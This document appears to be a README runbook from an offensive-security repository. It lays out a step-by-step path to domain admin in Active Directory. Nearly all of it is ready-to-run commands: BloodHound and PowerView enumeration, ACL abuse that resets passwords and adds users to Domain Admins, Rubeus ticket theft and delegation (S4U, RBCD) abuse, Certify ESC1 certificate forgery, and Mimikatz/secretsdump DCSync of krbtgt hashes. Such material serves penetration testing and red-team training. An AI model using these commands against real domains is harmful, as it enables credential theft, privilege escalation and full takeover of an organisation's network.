# Active Directory Exploitation Runbook

> Enumerate → Find misconfigs → Exploit trust relationships → DA

---

## Attack Flow

```
1. Enumerate with BloodHound (always first)
2. Identify attack paths (ACL abuse, delegation, ADCS)
3. Kerberoast / AS-REP Roast for hashes
4. Abuse delegation (constrained/unconstrained/RBCD)
5. Exploit ADCS for certificate auth
6. DCSync → Golden Ticket → persistence
```

---

## BloodHound Enumeration

```powershell
# Run SharpHound on domain-joined host
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.com -ZipFileName blood.zip

# Import into BloodHound (on Kali)
sudo neo4j start && bloodhound
# Upload blood.zip → "Find Shortest Path to Domain Admin"
```

---

## PowerView — AD Reconnaissance

```powershell
# Get domain info
Get-Domain
Get-DomainController

# Find Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Find all SPNs (Kerberoast candidates)
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Find accounts with no pre-auth (AS-REP roast candidates)
Get-DomainUser -PreauthNotRequired

# Check ACLs on object
Get-ObjectAcl -Identity "<USER_OR_GROUP>" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select samaccountname

# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```

---

## ACL Abuse

```powershell
# GenericAll on user → reset password
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on group → add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members <YOUR_USER>

# WriteDACL → grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity <YOUR_USER> -Rights All

# WriteOwner → take ownership, then grant rights
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <YOUR_USER>
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All
```

---

## Delegation Attacks

See `delegation/` for full walkthroughs.

### Unconstrained Delegation
```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select samaccountname

# If you compromise that machine, wait for DA to connect, steal TGT
.\Rubeus.exe monitor /interval:5 /nowrap    # monitor for new tickets
.\Rubeus.exe ptt /ticket:<base64>           # inject stolen TGT
```

### Constrained Delegation (S4U)
```powershell
# If you have machine account hash with constrained delegation
.\Rubeus.exe s4u /user:<MACHINE$> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:<TARGET_SPN> /ptt
```

### RBCD (Resource-Based Constrained Delegation)
```powershell
# Requires: GenericWrite/GenericAll on target computer object
# Step 1: Create fake machine account (or use existing compromised one)
# Step 2: Write msDS-AllowedToActOnBehalfOfOtherIdentity on target
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{msDS-AllowedToActOnBehalfOfOtherIdentity=<ATTACKER_COMPUTER_SID>}

# Step 3: S4U to get service ticket as admin
.\Rubeus.exe s4u /user:<ATTACKER_MACHINE$> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt
```

---

## ADCS (Certificate Services)

See `adcs/RUNBOOK.md` for full ADCS attacks.

```powershell
# Find vulnerable templates (ESC1: client auth + SAN allowed)
.\Certify.exe find /vulnerable

# Request certificate as admin (ESC1)
.\Certify.exe request /ca:<CA_HOST\CA_NAME> /template:<VULN_TEMPLATE> /altname:Administrator

# Convert .pem to .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use cert to get TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<CERT_PASS> /ptt
```

---

## DCSync (Extract Any Hash)

```
# Mimikatz (requires DS-Replication rights)
lsadump::dcsync /user:CORP\krbtgt
lsadump::dcsync /user:CORP\Administrator

# Impacket
python3 secretsdump.py corp/admin:password@<DC_IP>
```

---

## Files in This Directory

| File/Dir | Purpose |
|----------|---------|
| `enumeration/ComprehensiveImpersonation.cs` | Token impersonation C# code |
| `enumeration/Impersonate.cs` | Simple impersonation template |
| `enumeration/JEA.md` | JEA bypass notes |
| `delegation/Constrained Delegation runbook.md` | Constrained delegation walkthrough |
| `delegation/Unconstrained Delegation walkthrough.md` | Unconstrained delegation walkthrough |
| `delegation/Resource Based Constrained Delegation.md` | RBCD walkthrough |
| `adcs/` | Certificate service attacks |
